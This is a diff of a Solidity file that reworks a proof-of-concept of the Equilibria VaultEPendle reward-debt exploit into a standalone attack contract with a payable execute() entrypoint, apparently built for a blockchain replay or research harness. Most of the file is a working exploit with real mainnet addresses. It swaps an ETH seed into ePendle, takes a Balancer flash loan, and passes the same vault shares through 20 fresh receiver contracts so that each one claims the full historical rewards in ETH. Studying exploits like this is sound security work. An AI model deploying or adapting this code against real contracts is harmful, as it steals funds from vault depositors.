@@ -1,33 +1,27 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "../basetest.sol";
 import "../interface.sol";
 
-// @KeyInfo - Total Lost : 62,661.57 USD
-// Attacker : 0x4DCCc719f277eBeB8F7fdB68cD4b105E5bC325db
-// Attack Contract : 0x0A2d023b1EcFbFb091464ADEbc852e19E0F02E6b
-// Vulnerable Contract : 0x615b0B54e585ab83ba1c94a734cd4499dEc1C956
-// Attack Tx : https://etherscan.io/tx/0x185a16017fb4d9b2fefdf5935435253d53d4758238275426b507fe54eb4fe97a
-// Related Tx : https://etherscan.io/tx/0xc16984edf1ac3e50f1a10842310c7ab3983ab0d1f9f5eb6fb859a59e416048f8
-// Related Tx : https://etherscan.io/tx/0x0a60d7fb1d459ebee1ddcd62d1a8fcb8faa9aa1ebbb3203f90bea7dd888af8aa
+// Equilibria VaultEPendle (stk-ePendle) reward-debt bug, Ethereum mainnet,
+// Aug 2025. Standalone synthetic exploit for the EVM Playground recorder:
+// the real Foundry PoC runs the attack inline from ContractTest.testExploit()
+// via a helper `EquilibriaEPendleAttacker` contract (see the registry's
+// EquilibriaEPendle_exp.sol) — this version drops the forge-std `Test`
+// dependent wrapper and exposes a single payable `execute()` entrypoint that
+// the recorder deploys and calls directly, carrying the ETH seed as call
+// value instead of a constructor payment (the playground harness cannot send
+// value with a deployment).
 //
-// @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0x615b0B54e585ab83ba1c94a734cd4499dEc1C956#code
-//
-// @Analysis
-// Twitter Guy : https://t.me/defimon_alerts/1712
-//
-// Attack summary: The attacker flash-loaned ePendle, deposited it into VaultEPendle, and repeatedly moved the same
-// stk-ePendle shares into fresh receiver contracts. Each fresh receiver claimed historical native-token rewards and
-// forwarded the ETH to the attacker before the shares were pulled back.
-// Root cause: VaultEPendle did not update reward debt on ERC20 share transfers, and public getReward(address)
-// recomputed rewards for arbitrary fresh receiver accounts.
+// Attack summary: VaultEPendle never settles a holder's reward debt
+// (userRewardPerTokenPaid) on a plain ERC20 transfer of stk-ePendle shares,
+// and its public getReward(address) recomputes rewards for ANY account from
+// that account's CURRENT balance. So the same share balance can be paraded
+// through N freshly-deployed receiver contracts, each of which the vault
+// credits with the FULL historical reward stream (rewardPerTokenStored) as
+// if it had held the shares since inception, and pays out as native ETH.
 
-address constant ATTACKER = 0x4DCCc719f277eBeB8F7fdB68cD4b105E5bC325db;
-address constant ATTACK_CONTRACT = 0x0A2d023b1EcFbFb091464ADEbc852e19E0F02E6b;
 address constant VAULT_EPENDLE_PROXY = 0xd30d6fD662c0d92B49F3C3E478e125BA1D968059;
-address constant VAULT_EPENDLE_IMPLEMENTATION = 0x615b0B54e585ab83ba1c94a734cd4499dEc1C956;
 address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
 address payable constant WETH_TOKEN = payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 address constant PENDLE = 0x808507121B80c02388fAd14726482e061B8da827;
@@ -62,59 +56,23 @@ interface IBalancerFlashLoanRecipient {
     ) external;
 }
 
-contract ContractTest is BaseTestWithBalanceLog {
-    function setUp() public {
-        uint256 forkBlock = 23_203_451;
-        vm.createSelectFork("http://127.0.0.1:8545", forkBlock);
-
-        attacker = ATTACKER;
-        fundingToken = address(0);
-
-        vm.label(ATTACKER, "Attacker");
-        vm.label(ATTACK_CONTRACT, "Historical Attack Executor");
-        vm.label(VAULT_EPENDLE_PROXY, "VaultEPendle Proxy");
-        vm.label(VAULT_EPENDLE_IMPLEMENTATION, "VaultEPendle Implementation");
-        vm.label(BALANCER_VAULT, "Balancer Vault");
-        vm.label(EPENDLE, "ePendle");
-        vm.label(VAULT_EPENDLE_PROXY, "stk-ePendle");
-        vm.label(EQB, "EQB");
-        vm.label(XEQB, "xEQB");
-    }
-
-    function testExploit() public balanceLog {
-        vm.deal(ATTACKER, 0.01 ether);
-        uint256 attackerEthBefore = ATTACKER.balance;
-        uint256 vaultEthBefore = VAULT_EPENDLE_PROXY.balance;
-
-        // step 1: deploy a local executor with the same ETH seed used by the initcode transaction.
-        vm.startPrank(ATTACKER);
-        EquilibriaEPendleAttacker localAttack = new EquilibriaEPendleAttacker{value: 0.01 ether}(payable(ATTACKER));
-        vm.label(address(localAttack), "Local Attack Executor");
-
-        // step 2: seed ePendle, enter VaultEPendle, cycle fresh reward receivers, and repay Balancer.
-        localAttack.execute();
-        vm.stopPrank();
-
-        // step 3: prove the repeated native reward claim drained the vault to the attacker's receiver.
-        uint256 attackerEthProfit = ATTACKER.balance - attackerEthBefore;
-        assertGt(attackerEthProfit, 13 ether, "native ETH profit");
-        assertLt(VAULT_EPENDLE_PROXY.balance, vaultEthBefore - 13 ether, "vault native ETH not drained");
-    }
-}
-
 contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
     address payable private immutable profitReceiver;
 
     constructor(
         address payable profitReceiver_
-    ) payable {
+    ) {
         profitReceiver = profitReceiver_;
     }
 
     receive() external payable {}
 
-    function execute() external {
-        // step 1: convert the small ETH seed into PENDLE and deposit it as ePendle.
+    // Recorded entrypoint. Carries the 0.01 ETH seed as call value (the real
+    // tx sent it with the CREATE that deployed the attack contract; the
+    // playground recorder sends call value only on the recorded call, so the
+    // seed arrives here instead — the mechanics below are identical either way).
+    function execute() external payable {
+        // step 1: convert the ETH seed into PENDLE and deposit it as ePendle.
         uint256 seedEth = address(this).balance;
         IWETH(WETH_TOKEN).deposit{value: seedEth}();
         IERC20(WETH_TOKEN).approve(BALANCER_VAULT, seedEth);
@@ -123,10 +81,13 @@ contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
         IERC20(PENDLE).approve(EPENDLE_DEPOSITOR, pendleOut);
         IEPendleDepositor(EPENDLE_DEPOSITOR).deposit(pendleOut);
 
-        // step 2: harvest once so VaultEPendle holds the native rewards that will be repeatedly claimed.
+        // step 2: harvest once so VaultEPendle holds the native rewards that
+        // will be repeatedly claimed below.
         IEquilibriaVault(VAULT_EPENDLE_PROXY).harvest();
 
-        // step 3: borrow the Balancer ePendle liquidity used to mint a large stk-ePendle share balance.
+        // step 3: borrow the Balancer ePendle liquidity used to mint a large
+        // stk-ePendle share balance (amplifies the per-cycle claim; not
+        // required for the underlying bug).
         address[] memory tokens = new address[](1);
         tokens[0] = EPENDLE;
         uint256[] memory amounts = new uint256[](1);
@@ -143,12 +104,14 @@ contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
         require(msg.sender == BALANCER_VAULT, "not balancer");
         require(tokens.length == 1 && tokens[0] == EPENDLE, "unexpected flash loan");
 
-        // step 4: deposit all ePendle and derive the trace's repeated share amount from this contract's balance.
+        // step 4: deposit all ePendle and mint the stk-ePendle shares that
+        // will be paraded through fresh receivers.
         IERC20(EPENDLE).approve(VAULT_EPENDLE_PROXY, type(uint256).max);
         IEquilibriaVault(VAULT_EPENDLE_PROXY).depositAll();
         uint256 shareAmount = IERC20(VAULT_EPENDLE_PROXY).balanceOf(address(this));
 
-        // step 5: each fresh receiver has zero reward debt, so the same transferred shares can claim again.
+        // step 5: each fresh receiver has zero reward debt, so the same
+        // transferred shares can claim the full historical reward again.
         for (uint256 i = 0; i < 20; i++) {
             RewardReceiver receiver = new RewardReceiver(profitReceiver);
             IERC20(VAULT_EPENDLE_PROXY).transfer(address(receiver), shareAmount);
@@ -157,7 +120,7 @@ contract EquilibriaEPendleAttacker is IBalancerFlashLoanRecipient {
             receiver.exit();
         }
 
-        // step 6: withdraw ePendle and return the flash loan.
+        // step 6: withdraw ePendle and repay the flash loan.
         IEquilibriaVault(VAULT_EPENDLE_PROXY).withdrawAll();
         IERC20(EPENDLE).transfer(BALANCER_VAULT, amounts[0] + feeAmounts[0]);
     }
